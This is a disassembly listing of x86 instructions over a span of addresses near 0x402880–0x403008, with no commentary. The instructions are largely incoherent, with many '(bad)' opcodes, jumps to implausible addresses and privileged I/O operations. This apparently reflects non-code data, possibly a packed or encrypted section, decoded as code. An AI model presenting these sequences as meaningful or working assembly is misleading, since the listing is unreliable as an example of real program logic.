  40287b:	scas   al,BYTE PTR es:[edi]
  40287c:	pop    eax
  40287d:	retf   0xab04
  402880:	cmp    BYTE PTR [ebp-0x52],dl
  402883:	xchg   BYTE PTR [edi],bh
  402885:	mov    ds:0x2310ac8e,al
  40288a:	mov    ebx,0x91d9b265
  40288f:	or     esp,DWORD PTR [esi+0x4]
  402892:	jbe    0x4028f0
  402894:	loope  0x4028e3
  402896:	rcr    DWORD PTR [edx-0x7e],0x64
  40289a:	inc    ebp
  40289b:	shr    BYTE PTR [edi+edx*8-0x5438fab3],cl
  4028a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028a3:	ror    BYTE PTR [esp+edx*1+0x7d],1
  4028a7:	ret    
  4028a8:	jmp    0x35456d28
  4028ad:	xor    eax,0xcb6bfa52
  4028b2:	adc    al,0xdc
  4028b4:	pop    esp
  4028b5:	mov    ds:0xeb9b96fc,eax
  4028ba:	xchg   BYTE PTR [esi-0x7b],dl
  4028bd:	test   eax,0xce01e4a8
  4028c2:	stos   BYTE PTR es:[edi],al
  4028c3:	and    bx,WORD PTR [esi-0x2b]
  4028c7:	retf   
  4028c8:	in     eax,0xea
  4028ca:	scas   al,BYTE PTR es:[edi]
  4028cb:	push   edi
  4028cc:	int    0x4d
  4028ce:	push   cs
  4028cf:	(bad)  
  4028d1:	cmc    
  4028d2:	sub    BYTE PTR [edi+edi*1],ah
  4028d5:	fcom   DWORD PTR [edx-0x5d]
  4028d8:	fsubr  QWORD PTR [ecx]
  4028da:	lds    ecx,FWORD PTR [ebx]
  4028dc:	adc    BYTE PTR [esp+eiz*8],dl
  4028df:	add    dh,BYTE PTR [ecx]
  4028e1:	or     ch,BYTE PTR [ebp+0x36]
  4028e4:	test   BYTE PTR [edi+0x4a422224],0xdd
  4028eb:	mov    ebp,0x549ab0d3
  4028f0:	dec    ebp
  4028f1:	xlat   BYTE PTR ds:[ebx]
  4028f2:	daa    
  4028f3:	jecxz  0x402946
  4028f5:	push   si
  4028f7:	ins    DWORD PTR es:[edi],dx
  4028f8:	minps  xmm4,XMMWORD PTR [edx+0x4696b069]
  4028ff:	pop    ecx
  402900:	cmp    eax,0xa81911cb
  402905:	jbe    0x402890
  402907:	inc    edx
  402908:	mov    ebp,0xe1f351c4
  40290d:	jmp    0x402960
  40290f:	push   esp
  402910:	xchg   ebp,eax
  402911:	cmp    bh,BYTE PTR [edi+0xb]
  402914:	shr    dh,1
  402916:	stc    
  402917:	cmp    bh,ah
  402919:	inc    edx
  40291a:	fmul   st,st(1)
  40291c:	add    cl,BYTE PTR [ecx]
  40291e:	(bad)  
  40291f:	sub    DWORD PTR [edi],ebx
  402921:	not    DWORD PTR ds:0x47b25ef9
  402927:	mov    edi,DWORD PTR [ecx+eax*2]
  40292a:	(bad)
  40292d:	pop    es
  40292e:	push   esi
  40292f:	sub    eax,0x90ae2022
  402934:	xlat   BYTE PTR ds:[ebx]
  402935:	lock jcxz 0x402985
  402939:	inc    esp
  40293a:	(bad)  
  40293b:	and    al,ch
  40293d:	jne    0x4029bb
  40293f:	pop    ebp
  402940:	jmp    0xe4d058a9
  402945:	mov    ds:0xcf6caa0f,al
  40294a:	inc    esp
  40294b:	test   DWORD PTR [esp+edi*8],edx
  40294e:	stos   BYTE PTR es:[edi],al
  40294f:	pop    ecx
  402950:	data16 fdivr DWORD PTR [ebp+0x33c5f8d9]
  402957:	push   es
  402958:	dec    edx
  402959:	lods   al,BYTE PTR ds:[esi]
  40295a:	jmp    0x40291a
  40295c:	std    
  40295d:	clc    
  40295e:	pop    es
  40295f:	(bad)  
  402960:	aad    0x6f
  402962:	or     eax,0x7cd732ae
  402967:	cli    
  402968:	and    ecx,0xd7a14f40
  40296e:	jmp    0xb1385ef3
  402973:	loop   0x40292f
  402975:	in     al,dx
  402976:	leave  
  402977:	and    al,0xf8
  402979:	lods   eax,DWORD PTR ds:[esi]
  40297a:	fcom   DWORD PTR [edi]
  40297c:	in     al,dx
  40297d:	xor    BYTE PTR ds:0xedae1d81,al
  402983:	push   eax
  402984:	out    dx,eax
  402985:	jecxz  0x402929
  402987:	aad    0xa2
  402989:	mov    ds,WORD PTR [ebx-0x7f15aedf]
  40298f:	outs   dx,BYTE PTR ds:[esi]
  402990:	ds and ebp,esp
  402993:	mov    ecx,0x1d2508fd
  402998:	fs mov al,0xe3
  40299b:	fnstenv [eax]
  40299d:	xor    eax,DWORD PTR gs:[edi+eax*2-0x2d4e3d46]
  4029a5:	adc    ebp,DWORD PTR [edx-0x3c]
  4029a8:	or     ch,BYTE PTR [esi-0x4c]
  4029ab:	fcom   QWORD PTR [eax+0x19]
  4029ae:	ja     0x402959
  4029b0:	sub    edi,0xeea65a35
  4029b6:	aaa    
  4029b7:	mov    ch,0xa6
  4029b9:	mov    BYTE PTR [edx-0x26],cl
  4029bc:	dec    edi
  4029bd:	sti    
  4029be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029bf:	mov    dh,0x8d
  4029c1:	int3   
  4029c2:	aas    
  4029c3:	call   0xc56a:0xd459c8ec
  4029ca:	pop    esp
  4029cb:	enter  0x22f9,0x47
  4029cf:	aad    0x40
  4029d1:	pop    ss
  4029d2:	cmp    DWORD PTR [ebx],ebx
  4029d4:	xchg   ebx,eax
  4029d5:	xor    edx,DWORD PTR [edi-0x49]
  4029d8:	or     ch,BYTE PTR [edx]
  4029da:	out    dx,eax
  4029db:	iretw  
  4029dd:	or     al,0xea
  4029df:	shl    ecx,0x6f
  4029e2:	arpl   WORD PTR [ecx+0x19],ax
  4029e5:	sub    eax,edx
  4029e7:	lds    ecx,FWORD PTR [ecx-0x414ae929]
  4029ed:	or     dh,BYTE PTR [edx+edx*2]
  4029f0:	nop
  4029f1:	js     0x4029cf
  4029f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029f4:	adc    eax,0xcaec373f
  4029f9:	mov    dl,0x6b
  4029fb:	fiadd  WORD PTR [esi]
  4029fd:	jmp    FWORD PTR [edi-0x1e3ff6bb]
  402a03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a04:	cmp    eax,0xda869350
  402a09:	cmp    bl,BYTE PTR [ecx+ebx*2-0x33c60adf]
  402a10:	xchg   ecx,eax
  402a11:	fcmovne st,st(3)
  402a13:	std    
  402a14:	gs dec esi
  402a16:	pop    ss
  402a17:	call   0xc2940d6f
  402a1c:	lods   eax,DWORD PTR ds:[esi]
  402a1d:	imul   esi,DWORD PTR [eax],0xffffff90
  402a20:	or     al,BYTE PTR [ebx+0x63]
  402a23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a24:	mov    al,ds:0xcc6d3e3c
  402a29:	sar    BYTE PTR [eax],0x3e
  402a2c:	push   esp
  402a2d:	shl    DWORD PTR [edi+0x56b11d0],1
  402a33:	mov    ds:0x7566d599,eax
  402a38:	xchg   DWORD PTR [esi+0x7b],edi
  402a3b:	sub    dl,BYTE PTR [edx]
  402a3d:	lods   eax,DWORD PTR ds:[esi]
  402a3e:	add    esi,edx
  402a40:	scas   eax,DWORD PTR es:[edi]
  402a41:	repnz dec ecx
  402a43:	jno    0x4029f7
  402a45:	sub    eax,0xf7bcf402
  402a4a:	adc    esp,ecx
  402a4c:	or     al,0x95
  402a4e:	loop   0x4029eb
  402a50:	cmp    edx,DWORD PTR [eax]
  402a52:	jae    0x402ab0
  402a54:	les    ebx,FWORD PTR [ebp+0x4307ff45]
  402a5a:	cs sbb eax,0xb0d30138
  402a60:	leave  
  402a61:	test   eax,0xe2d552b4
  402a66:	sub    ch,ch
  402a68:	xchg   esp,eax
  402a69:	inc    esp
  402a6a:	jmp    0x1775:0xf5addd9b
  402a71:	enter  0xece1,0x8c
  402a75:	call   0xe868:0x75e65a45
  402a7c:	fmul   DWORD PTR [edx-0x1a662bd]
  402a82:	imul   esi,DWORD PTR ds:0x8a803b4b,0xffffffc6
  402a89:	adc    eax,0xb7480453
  402a8e:	inc    esi
  402a8f:	mov    eax,0x4c6225e6
  402a94:	and    ebx,esi
  402a96:	sub    al,0x5f
  402a98:	fld    QWORD PTR [esi-0x4f]
  402a9b:	bound  edx,QWORD PTR [ecx]
  402a9d:	imul   esi,DWORD PTR [ebp+0x38],0xffffffd3
  402aa1:	or     al,0x40
  402aa3:	sub    ecx,DWORD PTR [ecx]
  402aa5:	adc    dh,BYTE PTR [eax-0x3e9d07b]
  402aab:	and    bh,dh
  402aad:	mov    bh,0xfb
  402aaf:	and    ah,BYTE PTR [ebp-0x49990a97]
  402ab5:	pop    edi
  402ab6:	inc    eax
  402ab7:	xchg   DWORD PTR [eax-0xb40ce9c],esi
  402abd:	jae    0x402b22
  402abf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ac0:	and    DWORD PTR [eax],0xfffffff6
  402ac3:	repz add al,0x7f
  402ac6:	(bad)  
  402ac7:	bound  ecx,QWORD PTR [ecx+ebp*2-0x3f92242d]
  402ace:	adc    edi,DWORD PTR [ebx+0x5c]
  402ad1:	push   0xfc83cd20
  402ad6:	out    0x52,al
  402ad8:	sbb    eax,0x571be492
  402add:	jbe    0x402a86
  402adf:	adc    eax,0x96d32031
  402ae4:	sbb    cl,0xaf
  402ae7:	dec    edx
  402ae8:	jle    0x402b0c
  402aea:	inc    ecx
  402aeb:	test   DWORD PTR [eax-0x2553bb55],ecx
  402af1:	mov    ch,0x45
  402af3:	adc    al,0xe0
  402af5:	or     DWORD PTR [edx+0x7a],esp
  402af8:	in     eax,0xa6
  402afa:	popa   
  402afb:	sbb    al,BYTE PTR [eax]
  402afd:	int3   
  402afe:	push   ds
  402aff:	push   ds
  402b00:	inc    eax
  402b01:	mov    bh,0x71
  402b03:	or     DWORD PTR [ebx+0x1e],edx
  402b06:	xchg   ebx,eax
  402b07:	shr    BYTE PTR [eax-0x25104144],0xe7
  402b0e:	sub    cl,BYTE PTR [edi-0x28]
  402b11:	add    DWORD PTR [edx-0x54],edi
  402b14:	mov    ebp,0xc96831e4
  402b19:	push   esi
  402b1a:	cmp    DWORD PTR [ecx+0x17154957],edi
  402b20:	pop    esp
  402b21:	enter  0xc067,0x5d
  402b25:	outs   dx,DWORD PTR ds:[esi]
  402b26:	ja     0x402aff
  402b28:	(bad)  
  402b29:	dec    esi
  402b2a:	and    bl,BYTE PTR [ebp+0x7a6d2c63]
  402b30:	push   0x63
  402b32:	js     0x402b40
  402b34:	jns    0x402ba1
  402b36:	iret   
  402b37:	dec    ebx
  402b38:	inc    edi
  402b39:	pushf  
  402b3a:	sbb    al,cl
  402b3c:	push   ebp
  402b3d:	mov    dh,0x95
  402b3f:	les    edx,FWORD PTR [esi+0x7f]
  402b42:	jl     0x402b04
  402b44:	xlat   BYTE PTR ds:[ebx]
  402b45:	push   ecx
  402b46:	dec    esp
  402b47:	jo     0x402ae8
  402b49:	imul   edi,DWORD PTR [ebx+0xd594b00],0x48
  402b50:	mov    ds:0xc1b9478a,al
  402b55:	pop    esp
  402b56:	adc    DWORD PTR [ecx],ebp
  402b58:	(bad)  [eax]
  402b5a:	loope  0x402b4b
  402b5c:	mov    edx,0x5d4910c5
  402b61:	dec    edx
  402b62:	mov    BYTE PTR ds:0x2b5d,ch
  402b67:	push   0xffffff8e
  402b69:	xchg   esi,eax
  402b6a:	jno    0x402bd2
  402b6c:	sub    BYTE PTR [eax-0x14],0x3f
  402b70:	dec    edi
  402b71:	mov    bh,ah
  402b73:	gs mov ch,0x4a
  402b76:	stc    
  402b77:	fstp   st(7)
  402b79:	xchg   BYTE PTR [ebx],al
  402b7b:	xchg   edx,eax
  402b7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b7d:	ret    
  402b7e:	ds pop eax
  402b80:	or     dh,ch
  402b82:	jmp    0x3cf72195
  402b87:	xchg   edi,eax
  402b88:	mov    ebp,0x3fd97633
  402b8d:	scas   eax,DWORD PTR es:[edi]
  402b8e:	aad    0xab
  402b90:	pop    eax
  402b91:	or     ecx,DWORD PTR [edx+eiz*2-0x612ebba6]
  402b98:	mov    ebp,0x784a70df
  402b9d:	je     0x402bb0
  402b9f:	jp     0x402c09
  402ba1:	fnsave [eax+0x3f623c1f]
  402ba7:	xchg   esp,eax
  402ba8:	cmp    DWORD PTR [eax+0x68],esi
  402bab:	daa    
  402bac:	mov    bl,0x7
  402bae:	dec    edi
  402baf:	fs push esp
  402bb1:	cmp    BYTE PTR [ebx+0x62],0x76
  402bb5:	cwde   
  402bb6:	(bad)  
  402bb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402bb8:	add    BYTE PTR [edi-0x2ddaed6d],dl
  402bbe:	test   al,0x3d
  402bc0:	shl    DWORD PTR [edx],1
  402bc2:	js     0x402bea
  402bc4:	call   0xdb786360
  402bc9:	push   eax
  402bca:	les    ebx,FWORD PTR [ecx-0x28c62a6d]
  402bd0:	fwait
  402bd1:	je     0x402c30
  402bd3:	aam    0xf
  402bd5:	rcr    DWORD PTR [edi],cl
  402bd7:	outs   dx,BYTE PTR ds:[esi]
  402bd8:	popa   
  402bd9:	sar    ebx,0x1
  402bdc:	mov    al,0xbd
  402bde:	(bad)  
  402bdf:	xchg   esi,eax
  402be0:	enter  0x563f,0x74
  402be4:	mov    al,ds:0x5784a2e2
  402be9:	jno    0x402c2e
  402beb:	sub    BYTE PTR [edi-0x2ef53c43],0x14
  402bf2:	add    al,ah
  402bf4:	adc    al,0x44
  402bf6:	call   0x2929a2c5
  402bfb:	out    dx,eax
  402bfc:	or     eax,0xcbc82092
  402c01:	xchg   ecx,eax
  402c02:	jmp    0x1edb:0x5c1fd840
  402c09:	lods   eax,DWORD PTR ds:[esi]
  402c0a:	adc    BYTE PTR [edx+0x5e08bac4],0x7f
  402c11:	xor    DWORD PTR ds:0xaa50cf2,esp
  402c17:	into   
  402c18:	call   0x38f:0xd5a8bec5
  402c1f:	pop    esp
  402c20:	mov    dl,0xb3
  402c22:	add    BYTE PTR cs:[esi],bh
  402c25:	jecxz  0x402c35
  402c27:	jmp    0x4cac71e7
  402c2c:	fwait
  402c2d:	inc    ecx
  402c2e:	stos   BYTE PTR es:[edi],al
  402c2f:	xlat   BYTE PTR ds:[ebx]
  402c30:	aaa    
  402c31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c32:	lea    ebx,[esi]
  402c34:	xchg   ebp,eax
  402c35:	dec    edi
  402c36:	iret   
  402c37:	fs in  al,dx
  402c39:	cmp    BYTE PTR [esi],dl
  402c3b:	add    al,0x53
  402c3d:	sub    ebp,DWORD PTR [edx-0x31]
  402c40:	(bad)  
  402c41:	sub    DWORD PTR [esi+0x33048fe4],ecx
  402c47:	popf   
  402c48:	push   eax
  402c49:	inc    esi
  402c4a:	fnsave [ebx+eax*8-0x7e]
  402c4e:	mov    dl,0xb9
  402c50:	stos   BYTE PTR es:[edi],al
  402c51:	retf   0x3fd4
  402c54:	mov    esi,0xc1c51a7b
  402c59:	ja     0x402c5a
  402c5b:	inc    ebx
  402c5c:	add    eax,0xb3cc409e
  402c61:	xchg   ebx,eax
  402c62:	xor    eax,0x5ae1f290
  402c67:	jmp    0x62ed:0xd8878a98
  402c6e:	outs   dx,DWORD PTR gs:[esi]
  402c70:	out    dx,al
  402c71:	dec    esp
  402c72:	jo     0x402cbf
  402c74:	sahf   
  402c75:	das    
  402c76:	pop    esi
  402c77:	mov    DWORD PTR [edi+edi*1+0x6b],eax
  402c7b:	fisub  WORD PTR [esi-0x38]
  402c7e:	adc    bl,BYTE PTR [ebp-0x61]
  402c81:	mov    ecx,0xdd91e5fd
  402c86:	fst    QWORD PTR [esi+0x1c5027da]
  402c8c:	sahf   
  402c8d:	shr    BYTE PTR [esi],1
  402c8f:	cmp    edi,ebp
  402c91:	iret   
  402c92:	mov    edi,0xc7d3f6d6
  402c97:	or     edi,DWORD PTR [esp+ebx*4+0x68c48d5c]
  402c9e:	test   eax,0x16ba4650
  402ca3:	fdivr  QWORD PTR [edi]
  402ca5:	inc    DWORD PTR [eax+0x5]
  402ca8:	ins    DWORD PTR es:[edi],dx
  402ca9:	stos   DWORD PTR es:[edi],eax
  402caa:	sbb    eax,0xe752172a
  402caf:	gs push ds
  402cb1:	cmp    eax,0xbb1e0e0f
  402cb6:	mov    dh,0x24
  402cb8:	ror    DWORD PTR [edx],cl
  402cba:	cld    
  402cbb:	jmp    0xdfa989ee
  402cc0:	push   0xf
  402cc2:	pop    edi
  402cc3:	adc    dl,BYTE PTR [eax]
  402cc5:	and    eax,0x960cd688
  402cca:	leave  
  402ccb:	xor    esp,ebx
  402ccd:	(bad)  
  402cce:	in     al,0x92
  402cd0:	rol    BYTE PTR [ebx-0x66],1
  402cd3:	js     0x402c76
  402cd5:	dec    eax
  402cd6:	adc    eax,0x429f7f39
  402cdb:	nop
  402cdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cdd:	mov    esi,ebp
  402cdf:	es xor al,0x2d
  402ce2:	(bad)  
  402ce3:	mov    dh,0xd3
  402ce5:	push   es
  402ce6:	add    bh,cl
  402ce8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ce9:	push   ss
  402cea:	in     al,0xb
  402cec:	scas   eax,DWORD PTR es:[edi]
  402ced:	pop    ecx
  402cee:	mov    BYTE PTR [ebx-0x6b959599],bh
  402cf4:	mov    al,ds:0xc2559903
  402cf9:	jnp    0x402d38
  402cfb:	loope  0x402d52
  402cfd:	xor    bh,BYTE PTR [edi+0x4c]
  402d00:	xchg   ecx,eax
  402d01:	jbe    0x402d65
  402d03:	test   eax,0x5cc5a2d2
  402d08:	retf   
  402d09:	mov    eax,0xd8dfbc60
  402d0e:	pop    ss
  402d0f:	test   DWORD PTR [edx],0x6304b018
  402d15:	and    DWORD PTR [ebx-0x7fa12590],esi
  402d1b:	and    al,0x6d
  402d1d:	dec    esi
  402d1e:	jbe    0x402d13
  402d20:	rol    ecx,cl
  402d22:	test   BYTE PTR [edx+0x2244d37d],bl
  402d28:	sti    
  402d29:	xchg   edx,eax
  402d2a:	mov    dh,0xde
  402d2c:	mov    ebp,0x643fcc88
  402d31:	out    0xe2,eax
  402d33:	mov    ebx,0xef608e60
  402d38:	rol    BYTE PTR [eax-0x12],cl
  402d3b:	sub    BYTE PTR [edx],ch
  402d3d:	mov    edx,0x18fa5a00
  402d42:	int    0xb1
  402d44:	fisttp DWORD PTR [edi]
  402d46:	or     BYTE PTR [edx],dl
  402d48:	fcmovu st,st(0)
  402d4a:	ins    BYTE PTR es:[edi],dx
  402d4b:	mov    ebp,0x58f644ff
  402d50:	lock mov ebp,0xe22fec2c
  402d56:	pop    esp
  402d57:	popa   
  402d58:	pop    es
  402d59:	rcl    BYTE PTR [ebx-0x505b34e],cl
  402d5f:	rcr    ebx,1
  402d61:	lds    ebx,FWORD PTR [ebx]
  402d63:	ret    0xcfb6
  402d66:	or     ah,BYTE PTR [esi-0x31a14c1e]
  402d6c:	outs   dx,BYTE PTR ds:[esi]
  402d6d:	or     ch,BYTE PTR [ebp-0x20]
  402d70:	and    BYTE PTR [esi+0x78cd8b61],ch
  402d76:	dec    ebp
  402d77:	ins    BYTE PTR es:[edi],dx
  402d78:	xchg   edx,eax
  402d79:	(bad)  
  402d7a:	jmp    0x402d8e
  402d7c:	ret    
  402d7d:	push   edi
  402d7e:	ss xchg ecx,eax
  402d80:	fwait
  402d81:	add    bh,BYTE PTR [ecx]
  402d83:	cs cld 
  402d85:	jmp    0xfc55:0x2d3203cd
  402d8c:	adc    ebx,DWORD PTR [edx+0x58]
  402d8f:	pop    esp
  402d90:	jae    0x402df7
  402d92:	sub    ebp,DWORD PTR ds:[ecx-0x5e]
  402d96:	xchg   DWORD PTR [ebx+0x34a6e4fd],ecx
  402d9c:	jg     0x402da6
  402d9e:	lahf   
  402d9f:	lods   eax,DWORD PTR ds:[esi]
  402da0:	xchg   esp,eax
  402da1:	inc    ecx
  402da2:	retf   
  402da3:	adc    ebx,DWORD PTR [eax-0x7c]
  402da6:	mov    al,0xa
  402da8:	jge    0x402e1e
  402daa:	sti    
  402dab:	aam    0x74
  402dad:	xchg   edi,eax
  402dae:	ja     0x402d85
  402db0:	push   ds
  402db1:	push   cs
  402db2:	sti    
  402db3:	out    dx,al
  402db4:	pop    es
  402db5:	xor    al,0x6a
  402db7:	stos   DWORD PTR es:[edi],eax
  402db8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402db9:	sbb    ah,BYTE PTR [eax+0x3590d327]
  402dbf:	loope  0x402db2
  402dc1:	pop    eax
  402dc2:	mov    ds:0x5711a06e,eax
  402dc7:	not    edx
  402dc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402dca:	enter  0xdbe2,0x7f
  402dce:	fmulp  st(0),st
  402dd0:	loop   0x402d82
  402dd2:	push   ebx
  402dd3:	jb     0x402e4b
  402dd5:	clc    
  402dd6:	xor    dh,dh
  402dd8:	and    ah,bh
  402dda:	out    0xc4,eax
  402ddc:	add    eax,0x3f30c466
  402de1:	dec    eax
  402de2:	ins    DWORD PTR es:[edi],dx
  402de3:	cmp    DWORD PTR [ebx],edx
  402de5:	pop    ds
  402de6:	xchg   ebp,eax
  402de7:	aas    
  402de8:	jle    0x402e18
  402dea:	adc    dl,dl
  402dec:	mov    edx,0xe257a747
  402df1:	add    DWORD PTR [eax+0x39fdc6ae],0x38
  402df8:	inc    eax
  402df9:	xor    DWORD PTR [esi],edx
  402dfb:	stos   BYTE PTR es:[edi],al
  402dfc:	call   0x1c0c:0x12146742
  402e03:	xchg   ebx,eax
  402e04:	rcl    DWORD PTR [ebp+0x6f],0xe1
  402e08:	lods   al,BYTE PTR ds:[esi]
  402e09:	gs sbb ebp,DWORD PTR fs:[edi+0x49188e54]
  402e11:	shl    DWORD PTR [ebx-0x2211bad5],cl
  402e17:	mov    dl,0xac
  402e19:	sub    DWORD PTR [edx],esi
  402e1b:	sbb    al,0xdc
  402e1d:	cmc    
  402e1e:	push   ebp
  402e1f:	das    
  402e20:	or     al,BYTE PTR [edx+0x70]
  402e23:	loope  0x402e9e
  402e25:	or     eax,0x119c1647
  402e2a:	(bad)  
  402e2b:	jp     0x402e1b
  402e2d:	jo     0x402e4f
  402e2f:	jge    0x402ea1
  402e31:	pop    ebp
  402e32:	in     al,dx
  402e33:	push   0x5fb6ab3c
  402e38:	mov    edi,0xde8c2bdb
  402e3d:	and    BYTE PTR [edx-0x56],cl
  402e40:	mov    BYTE PTR [ebx],bl
  402e42:	sbb    al,0xbc
  402e44:	lods   al,BYTE PTR cs:[esi]
  402e46:	ror    BYTE PTR [edx+0x284c4a29],cl
  402e4c:	dec    eax
  402e4d:	pushf  
  402e4e:	add    al,0xaf
  402e50:	ror    BYTE PTR [ecx-0x6b],0xe
  402e54:	sbb    BYTE PTR [eax-0x1d23380a],0x5e
  402e5b:	sub    eax,0xaf8587c1
  402e60:	mov    eax,gs:0x3520e819
  402e66:	es push ds
  402e68:	push   edi
  402e69:	ss xor ch,al
  402e6c:	sbb    ah,BYTE PTR [eax]
  402e6e:	ret    
  402e6f:	or     edx,DWORD PTR [ecx]
  402e71:	cwde   
  402e72:	test   al,0xf3
  402e74:	dec    esp
  402e75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e76:	clc    
  402e77:	jne    0x402ed2
  402e79:	in     eax,dx
  402e7a:	repnz adc al,0xda
  402e7d:	push   0x1d
  402e7f:	pop    ss
  402e80:	dec    ecx
  402e81:	aad    0x49
  402e83:	dec    eax
  402e84:	cmp    BYTE PTR [ecx-0x57],dh
  402e87:	ss retf 
  402e89:	dec    eax
  402e8a:	rdmsr  
  402e8c:	xchg   edi,eax
  402e8d:	push   ebx
  402e8e:	add    al,0xf
  402e90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e91:	add    DWORD PTR [eax-0x20fb3ba0],0x55e74f8c
  402e9b:	ins    BYTE PTR es:[edi],dx
  402e9c:	dec    eax
  402e9d:	cmp    eax,0xcde0097e
  402ea2:	loop   0x402ec4
  402ea4:	push   edi
  402ea5:	aaa    
  402ea6:	scas   eax,DWORD PTR es:[edi]
  402ea7:	or     BYTE PTR [eax],bl
  402ea9:	daa    
  402eaa:	ficom  DWORD PTR [edx-0x57]
  402ead:	outs   dx,BYTE PTR ds:[esi]
  402eae:	add    bh,BYTE PTR [eax]
  402eb0:	data16 scas al,BYTE PTR es:[edi]
  402eb2:	aam    0x97
  402eb4:	jg     0x402e8b
  402eb6:	pop    esi
  402eb7:	scas   al,BYTE PTR es:[edi]
  402eb8:	xor    ebp,DWORD PTR [esi]
  402eba:	loop   0x402eaf
  402ebc:	xchg   edx,eax
  402ebd:	imul   ecx,DWORD PTR [edx+0x25e58301],0xbdf4aa5b
  402ec7:	bound  edx,QWORD PTR [esi-0x26f42]
  402ecd:	or     al,0x5b
  402ecf:	mov    ecx,0x56a019f5
  402ed4:	cld    
  402ed5:	push   eax
  402ed6:	and    ebx,edi
  402ed8:	xor    DWORD PTR [eax],edi
  402eda:	pop    eax
  402edb:	pusha  
  402edc:	mov    al,ds:0x939f9baa
  402ee1:	gs dec edi
  402ee3:	daa    
  402ee4:	idiv   BYTE PTR [edi+edi*8+0x1]
  402ee8:	jmp    0xadadc57
  402eed:	fistp  QWORD PTR [edx]
  402eef:	fadd   st(3),st
  402ef1:	(bad)  
  402ef2:	imul   ebp,DWORD PTR [edi+0x44],0xbc5fe64a
  402ef9:	dec    esp
  402efa:	and    al,0x6d
  402efc:	imul   eax,DWORD PTR [eax],0xeba52c57
  402f02:	data16 scas al,BYTE PTR es:[edi]
  402f04:	sbb    BYTE PTR [ebp-0x1ef1d569],dh
  402f0a:	jg     0x402f8a
  402f0c:	aad    0x2
  402f0e:	test   BYTE PTR [edx-0x7cd6633e],cl
  402f14:	push   es
  402f15:	stos   BYTE PTR es:[edi],al
  402f16:	xchg   ebx,eax
  402f17:	scas   al,BYTE PTR es:[edi]
  402f18:	xchg   edi,eax
  402f19:	cmp    ebx,ebp
  402f1b:	cmp    esp,DWORD PTR [ebx]
  402f1d:	daa    
  402f1e:	jbe    0x402ed8
  402f20:	xchg   DWORD PTR [ecx+0x4b],eax
  402f23:	loopne 0x402f9a
  402f25:	addr16 test al,0x8b
  402f28:	(bad)
  402f2b:	cdq    
  402f2c:	inc    ecx
  402f2d:	and    al,0x27
  402f2f:	retf   0xd04d
  402f32:	(bad)
  402f35:	mov    ecx,0xd305f003
  402f3a:	cmp    DWORD PTR [ebx],esi
  402f3c:	cs add al,0x53
  402f3f:	sysexit 
  402f41:	test   al,0x34
  402f43:	aad    0x2c
  402f45:	test   eax,0xdc7268ba
  402f4a:	(bad)  
  402f4b:	xchg   ebx,eax
  402f4c:	cs das 
  402f4e:	add    dh,ch
  402f50:	mov    al,ds:0xae3afd8f
  402f55:	lds    ebx,FWORD PTR [edx+0x7f16ba50]
  402f5b:	sub    esi,DWORD PTR [eax+0x74]
  402f5e:	out    0x8,al
  402f60:	push   eax
  402f61:	or     eax,esp
  402f63:	fisubr DWORD PTR [esi+eax*1+0x1194565e]
  402f6a:	popf   
  402f6b:	cmp    al,0xfa
  402f6d:	dec    esp
  402f6e:	sub    ch,BYTE PTR [edx+ebx*4+0x18]
  402f72:	hlt    
  402f73:	add    DWORD PTR [eax],esi
  402f75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f76:	jne    0x402fb6
  402f78:	retf   
  402f79:	aas    
  402f7a:	mov    ds:0x98fd6ee0,al
  402f7f:	mov    al,ds:0xead6788a
  402f84:	lods   eax,DWORD PTR ds:[esi]
  402f85:	hlt    
  402f86:	ret    
  402f87:	xchg   esp,eax
  402f88:	sub    eax,edi
  402f8a:	jp     0x402f43
  402f8c:	jb     0x402f73
  402f8e:	inc    ebx
  402f8f:	mov    al,ds:0x3e889d20
  402f94:	push   edx
  402f95:	jns    0x402f3d
  402f97:	imul   ebx,DWORD PTR [ebx+0x53],0x58046f6f
  402f9e:	jmp    0x402f2a
  402fa0:	icebp  
  402fa1:	loop   0x40301e
  402fa3:	push   0x12
  402fa5:	mov    dl,0x61
  402fa7:	cmp    bh,BYTE PTR ds:0xb8578a70
  402fad:	(bad)  
  402fae:	sub    esp,DWORD PTR [eax]
  402fb0:	fiadd  DWORD PTR [edi+0x70]
  402fb3:	pop    ecx
  402fb4:	arpl   WORD PTR [ebp-0x6e],sp
  402fb7:	add    edx,esp
  402fb9:	jp     0x40300d
  402fbb:	jecxz  0x402fb7
  402fbd:	mov    dh,0x5c
  402fbf:	xor    BYTE PTR [ebx+edx*8-0xc3daf4d],0x3a
  402fc7:	xor    edi,0xffffffdc
  402fca:	bnd jno 0x40300c
  402fcd:	(bad)  
  402fce:	retf   
  402fcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fd0:	inc    ebx
  402fd1:	ror    BYTE PTR [ecx-0x35],0x6
  402fd5:	cmp    eax,0xfe1dedc1
  402fda:	pop    eax
  402fdb:	pop    ebp
  402fdc:	adc    al,0xbc
  402fde:	ret    0xd812
  402fe1:	stos   DWORD PTR es:[edi],eax
  402fe2:	fsubr  st,st(5)
  402fe4:	rcl    ebp,cl
  402fe6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fe7:	or     DWORD PTR [eax],esi
  402fe9:	sahf   
  402fea:	cdq    
  402feb:	mov    esi,0x3243b303
  402ff0:	popa   
  402ff1:	mov    edi,0x5c3c5b7a
  402ff6:	add    BYTE PTR ds:0xe718a4e3,bh
  402ffc:	jmp    0x16d3:0xf7345c6b
  403003:	clc    
  403004:	(bad)  
  403005:	sub    esp,DWORD PTR [eax]
  403007:	leave  
  403008:	xchg   ebp,eax
